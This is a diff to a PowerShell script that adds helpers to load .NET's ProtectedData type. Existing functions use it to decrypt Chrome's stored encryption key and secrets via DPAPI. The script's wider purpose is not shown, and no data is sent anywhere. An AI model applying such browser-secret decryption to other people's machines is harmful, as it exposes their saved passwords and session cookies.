@@ -799,6 +799,45 @@ function Ensure-BouncyCastleAssembly {
     }
 }
 
+function Get-ProtectedDataType {
+    foreach ($asm in [AppDomain]::CurrentDomain.GetAssemblies()) {
+        $type = $asm.GetType('System.Security.Cryptography.ProtectedData', $false)
+        if ($type) { return $type }
+    }
+    return $null
+}
+
+function Ensure-ProtectedDataSupport {
+    if ($script:ProtectedDataReady) { return $true }
+
+    if (Get-ProtectedDataType) {
+        $script:ProtectedDataReady = $true
+        return $true
+    }
+
+    $assemblyNames = @(
+        'System.Security.Cryptography.ProtectedData',
+        'System.Security',
+        'System.Security.Cryptography'
+    )
+
+    foreach ($assemblyName in $assemblyNames) {
+        try {
+            Add-Type -AssemblyName $assemblyName -ErrorAction Stop | Out-Null
+        } catch {
+            continue
+        }
+
+        if (Get-ProtectedDataType) {
+            $script:ProtectedDataReady = $true
+            return $true
+        }
+    }
+
+    Write-Log -Message 'System.Security.Cryptography.ProtectedData type is unavailable; DPAPI decryption will be skipped.' -Level 'ERROR'
+    return $false
+}
+
 function Get-ChromeEncryptionKey {
     [CmdletBinding()]
     param([Parameter(Mandatory=$true)][string]$UserDataPath)
@@ -827,6 +866,9 @@ function Get-ChromeEncryptionKey {
 
         $payload = New-Object byte[] ($keyBytes.Length - $prefix.Length)
         [Array]::Copy($keyBytes, $prefix.Length, $payload, 0, $payload.Length)
+        if (-not (Ensure-ProtectedDataSupport)) {
+            return $null
+        }
         return [System.Security.Cryptography.ProtectedData]::Unprotect(
             $payload,
             $null,
@@ -883,6 +925,9 @@ function ConvertFrom-ChromeSecret {
             return ([System.Text.Encoding]::UTF8.GetString($output, 0, $bytesProcessed)).TrimEnd([char]0)
         }
 
+        if (-not (Ensure-ProtectedDataSupport)) {
+            return ''
+        }
         $dpapiBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
             $Data,
             $null,
